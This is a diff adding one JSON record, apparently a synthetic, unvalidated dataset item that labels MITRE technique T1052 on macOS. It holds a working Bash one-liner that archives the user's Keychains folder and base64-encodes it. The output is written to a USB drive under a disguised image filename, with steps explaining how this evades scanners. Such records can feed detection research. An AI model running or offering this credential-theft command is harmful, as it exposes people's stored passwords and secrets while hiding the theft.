@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar -czf - ~/Library/Keychains | base64 > /Volumes/USB/DCIM/.IMG0012.JPG",
+  "explanation": "Packages sensitive keychain data into a base64-encoded blob disguised with an image-like name on the USB drive.",
+  "rationale_steps": [
+    "Archive and compress target files entirely locally.",
+    "Base64-encode to avoid content-based scanners and binary signatures.",
+    "Write to removable media with an inconspicuous filename.",
+    "No network channels are used; data is staged for physical exfil."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-19e64b98-0e9dcbd5",
+  "source_prompt_hash": "19e64b98",
+  "timestamp_utc": "2025-09-30T05:31:52.812086Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
